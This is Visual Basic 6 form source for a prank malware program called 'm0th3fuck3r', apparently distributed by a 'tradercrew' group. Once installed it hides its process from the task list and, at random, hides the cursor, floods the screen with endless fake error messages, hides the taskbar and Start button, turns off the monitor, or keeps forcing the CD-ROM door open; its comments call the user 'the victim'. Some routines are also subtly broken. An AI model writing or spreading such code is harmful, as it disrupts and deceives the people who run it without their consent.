VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "m0th3fuck3r (ver 1.0 , by §3raptor)"
   ClientHeight    =   3225
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5295
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   ScaleHeight     =   3225
   ScaleWidth      =   5295
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   4200
      Top             =   1800
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   5
      Text            =   "Text1"
      Top             =   1800
      Width           =   375
      Visible         =   0   'False
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Quit (!)"
      Height          =   615
      Left            =   1200
      TabIndex        =   2
      Top             =   2040
      Width           =   2775
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Install m0th3rfuck3r to this computer"
      Height          =   615
      Left            =   1200
      TabIndex        =   1
      Top             =   1320
      Width           =   2775
   End
   Begin VB.Label Label3 
      Caption         =   "T    R    A    D    E    R    C    R    E   W"
      Height          =   2655
      Left            =   4920
      TabIndex        =   4
      Top             =   120
      Width           =   375
   End
   Begin VB.Label Label2 
      BorderStyle     =   1  'Fixed Single
      Caption         =   "If you want more of my appz... visit: http://www.tradercrew.com"
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   2880
      Width           =   4815
   End
   Begin VB.Label Label1 
      BorderStyle     =   1  'Fixed Single
      Caption         =   $"Form1.frx":0000
      Height          =   1095
      Left            =   480
      TabIndex        =   0
      Top             =   0
      Width           =   4335
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function ShowCursor& Lib "user32" _
    (ByVal bShow As Long)
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Dim cdcase
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
    (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, _
    ByVal lParam As Long) As Long
    Private Const WM_SYSCOMMAND = &H112&
    Private Const SC_MONITORPOWER = &HF170&
    Dim dat As Variant


Private Sub Command1_Click()
Me.Hide
Form2.Show
End Sub

Private Sub Form_Load()
cdcase = 1
test
1 End Sub


Public Sub test()
hid3app
Dim installed
installed = GetSetting("tradercrew", "security", "installed")
If installed = "yes" Then GoTo 1 Else GoTo 3
1 fuck
Me.Hide
GoTo 3
3 End Sub
Public Sub fuck()
Dim fuckthing As String
Randomize
Text1 = Int((10 * Rnd) + 1)
If Text1 = "1" Then f1 Else GoTo 2
2 If Text1 = "2" Then f2 Else GoTo 3
3 If Text1 = "3" Then f3 Else GoTo 4
4 If Text1 = "4" Then f4 Else GoTo 5
5 If Text1 = "5" Then f5 Else GoTo 6
6 If Text1 = "6" Then f6 Else GoTo 7
7 If Text1 = "7" Then f7 Else GoTo 8
8 If Text1 = "8" Then f8 Else GoTo 9
9 If Text1 = "9" Then f9 Else GoTo 10
10 If Text1 = "10" Then f10 Else

Me.Show
End Sub

Public Sub hid3app()


    Dim process As Long
    process = GetCurrentProcessId()
    Call RegisterServiceProcess(process, RSP_SIMPLE_SERVICE)
End Sub

Public Sub f1()
Dim bShow
ShowCursor (bShow = True)
End Sub

Public Sub f2()
Call Me.Hide
Call Form4.Show
End Sub

Public Sub f3()
cdromfucker
End Sub

Public Sub f4()
' flood with errors!
1 MsgBox "Fatal error at module: #FF11%&sa1... try to restart...", vbExclamation, "ERROR!"
GoTo 1
End Sub

Public Sub f5()
' disables task bar
Dim hwnd1
   hwnd1 = FindWindow("Shell_traywnd", "")
    Call SetWindowPos(hwnd1, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
End Sub

Public Sub f6()
 ' hides start - button
Dim window
Dim button
Dim botao
Dim janela
    window = FindWindow("Shell_traywnd", "")
    button = GetWindow(janela, GW_CHILD)
    Call ShowWindow(botao, SW_HIDE)
End Sub

Public Sub f7()
' turn screen of
SendMessage Form1.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, 0&
SendMessage Form2.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, 0&
SendMessage Form3.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, 0&
SendMessage Form4.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, 0&
End Sub

Public Sub f8()
Call Me.Hide
Call Form5.Show
End Sub

Public Sub f9()
Call Form6.Show
End Sub

Public Sub f10()
' i don't have more ideas on what could happend here... so... i leaved it empty ;)
End Sub

Public Sub cdromfucker()
Timer1.Enabled = True
End Sub

Sub CDOpen()
Dim returnstring
Dim retvalue
    retvalue = mciSendString("set CDAudio door open", returnstring, 127, 0)
End Sub

Private Sub Timer1_Timer()
' makes the cdrom door open... if the victim close it... it will open again... ;)
If cdcase = 1 Then
    CDOpen
End If
End Sub
